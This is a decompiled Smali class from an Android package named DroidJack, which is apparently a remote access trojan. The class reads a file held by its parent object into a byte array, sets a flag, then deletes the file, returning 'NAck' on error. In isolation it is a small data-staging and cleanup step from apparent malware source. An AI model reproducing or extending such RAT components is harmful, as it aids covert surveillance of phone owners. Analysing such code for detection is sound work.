.class Lnet/droidjack/server/ai;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/ah;


# direct methods
.method constructor <init>(Lnet/droidjack/server/ah;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/ai;->a:Lnet/droidjack/server/ah;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()[B
    .locals 3

    :try_start_0
    new-instance v0, Ljava/io/FileInputStream;

    iget-object v1, p0, Lnet/droidjack/server/ai;->a:Lnet/droidjack/server/ah;

    invoke-static {v1}, Lnet/droidjack/server/ah;->a(Lnet/droidjack/server/ah;)Ljava/io/File;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-static {v0}, La/c;->a(Ljava/io/InputStream;)[B

    move-result-object v0

    iget-object v1, p0, Lnet/droidjack/server/ai;->a:Lnet/droidjack/server/ah;

    const/4 v2, 0x1

    invoke-static {v1, v2}, Lnet/droidjack/server/ah;->a(Lnet/droidjack/server/ah;Z)V

    iget-object v1, p0, Lnet/droidjack/server/ai;->a:Lnet/droidjack/server/ah;

    invoke-static {v1}, Lnet/droidjack/server/ah;->a(Lnet/droidjack/server/ah;)Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/ai;->a()[B

    move-result-object v0

    return-object v0
.end method
